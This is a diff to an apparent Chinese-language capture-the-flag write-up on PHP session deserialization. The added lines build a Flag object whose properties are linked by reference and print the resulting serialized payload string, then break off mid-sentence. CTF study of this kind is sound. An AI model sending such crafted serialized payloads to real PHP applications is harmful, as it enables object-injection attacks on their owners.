@@ -34,3 +34,24 @@ $_SESSION['a'] = $_GET['a'];
 ```
 提供了一个session提交的接口
 此时只需要构造新的Flag类即可
+
+```php
+<?php
+class Flag
+{
+    public $name;
+    public $her;
+}
+
+$a = new Flag();
+$a->name = &$a->her;
+
+echo serialize($a);
+```
+构造引用
+```php
+O:4:"Flag":2:{s:4:"name";N;s:3:"her";R:2;}
+```
+得到要反序列化的内容
+
+又因为此时
